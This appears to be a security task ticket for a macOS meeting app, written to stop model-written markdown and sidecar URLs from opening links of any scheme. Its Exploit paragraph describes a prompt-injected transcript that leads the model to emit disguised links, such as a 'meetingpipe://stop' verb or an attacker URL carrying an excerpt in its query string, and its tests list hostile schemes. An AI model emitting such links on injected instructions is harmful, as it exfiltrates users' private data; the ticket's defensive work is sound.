---
id: SEC30
title: Model-written text in the app renders clickable links of any URL scheme, including the app's own unconfirmed `meetingpipe://` verbs, and publish sidecar URLs are opened with no scheme check
category: Security
status: new
priority: P2
comment: Filed 2026-11-12 ([security review](../../audits/2026-11-12-security-review.md) finding 5 and an informational page_url note): SummaryMarkdown.inline, ActionItemRow.taskAttributed and AskView parse model text with AttributedString(markdown:), no OpenURLAction exists anywhere, so a disguised link opens meetingpipe://stop, file:, smb: or an https exfil URL on one click; RichTextShare emits href for any scheme; page_url from sidecars goes straight to NSWorkspace.open. One shared URL policy reusing GuideDocument.canFollow. [Spec](./SEC30.md)
---

# SEC30: model-written text in the app renders clickable links of any URL scheme, including the app's own unconfirmed `meetingpipe://` verbs, and publish sidecar URLs are opened with no scheme check

Band origin: filed 2026-11-12 from the [2026-11-12 security review](../../audits/2026-11-12-security-review.md), finding 5, plus the review's informational `page_url` note. Status and priority live in this file's header; [INDEX.md](../INDEX.md) lists every task.

## Context

Verified 2026-11-12 (a scratch `swift` probe of the parser, and a grep of `daemon/Sources` and `daemon/Tests`):

- `SummaryMarkdown.inline` (`SummaryRenderedView.swift`) parses with `AttributedString(markdown:)`, `interpretedSyntax: .inlineOnly`; its doc comment says it keeps proper `[text](url)` links on purpose. It renders every summary, decision, question and extra-section bullet, in the Library and in `DigestsView` (which reuses `SummaryRenderedView`). `ActionItemRow.taskAttributed` does the same for `action.task`; `AskView` renders each answer line through `SummaryMarkdown.inline`.
- The parser attaches `.link` with no scheme filter: `meetingpipe://stop`, `meetingpipe://record`, `meetingpipe://ask?q=`, `file:///Applications/X.app`, `smb://host/share`, `x-apple.systempreferences:`, `javascript:` and `https://...?d=...` all became links, as did bare `https://`, `www.` and email text. The label hides the target.
- No `openURL`, `OpenURLAction`, `.environment(\.openURL` or `onOpenURL` exists, so SwiftUI's default hands the click to `NSWorkspace.open`. A `meetingpipe://` URL comes back to `App.application(_:open:)` and `handleAutomation` with `source: "url_scheme"`, which reaches the unconfirmed verbs [AUTO7](./AUTO7.md) covers.
- `RichTextShare.inlineHTML` escapes HTML first (no tag injection) but its link rule emits `<a href="$2">` for any scheme into copied rich text.
- The only allowlist in the daemon is `GuideDocument.canFollow` (http, https, mailto), guarding the trusted bundled guide.
- Nothing in the pipeline strips URLs from these fields; [SEC28](./SEC28.md) adds that at the schema, which makes this task defence in depth for summaries but not for Ask answers (free text from `engine.complete_text`).

Exploit: a prompt-injected transcript gets the model to write `[Q3 deck](meetingpipe://stop)` or `[source](https://attacker/?d=<excerpt>)`. One click by the owner stops a live recording, starts one, runs a cloud Ask, opens an app or a share, or sends library text off the Mac through the browser, outside the egress guard even under NDA. It needs model compliance and a click, hence P2.

**`page_url` sibling (informational).** `MeetingDetailView.notion(at:)` and `PublishResult.load` turn the sidecar's `page_url` into `URL(string:)`, and the header buttons and `PublishLanding.localNote` pass it to `NSWorkspace.shared.open`. The pipeline only ever writes an `https` Notion URL from the API response or a `file://` URL to a slugged `.md`, so model text cannot steer it; the one boundary-crossing case is a tampered backup the owner restores (it could plant `x.command` plus a sidecar pointing at it) followed by a click on that meeting's icon.

## Scope

1. **One URL policy** (seam: lift `GuideDocument.canFollow` into a shared `ExternalURLPolicy` in the daemon) with two entry points: `canOpenFromModelText(URL)` allows `http`, `https` and `mailto` only and always refuses `meetingpipe:`; `canOpenPublishTarget(URL, sink)` allows `https` for Notion and only a `file` URL ending in `.md` under the configured sink root for filesystem, Obsidian and LAN.
2. Attach `.environment(\.openURL, OpenURLAction { ... })` at `SummaryRenderedView`, `AskView` and any other surface that renders model text, returning `.discarded` for a refused URL and `.systemAction` for an allowed one. For an allowed `https` link whose label text differs from its host, show the full URL before opening (a confirm), since the allowlist alone does not stop a query-string leak.
3. `RichTextShare.inlineHTML` emits `href` only for URLs that pass `canOpenFromModelText`; any other link becomes its label text.
4. The publish open sites (`MeetingDetailView` header buttons, `PublishLanding.localNote`, the notification Open action) go through `canOpenPublishTarget`; a refused URL logs one diagnostics line and opens nothing.

## Explicitly not

- Confirming `meetingpipe://` verbs that other apps send: [AUTO7](./AUTO7.md). This task stops the app from feeding its own scheme from model text.
- Stripping links in the pipeline: [SEC28](./SEC28.md).
- The Guide window: already allowlisted.

## Acceptance

- `ExternalURLPolicyTests`: the scheme table above for both entry points, including `meetingpipe://stop`, `file:///x.app`, `smb://h/s`, `javascript:x`, a `file` URL outside the sink root, and a `file` URL ending `.command`.
- A test that `RichTextShare.inlineHTML("[a](meetingpipe://stop)")` contains no `href`, and `[a](https://x)` keeps it.
- A fence test (in the `TutorialFenceTests` style) that every view rendering `SummaryMarkdown.inline` sits under the `OpenURLAction` environment, or a grep fence that `NSWorkspace.shared.open` is called only from the policy's helpers.
- `cd daemon && swift build` and `swift test` green with the new test count in the commit body; `bash scripts/ci-local.sh` green.
- Owner check (confirms): a summary hand-edited to contain `[x](meetingpipe://stop)` shows an inert label while recording, and a real https link still opens after the confirm.
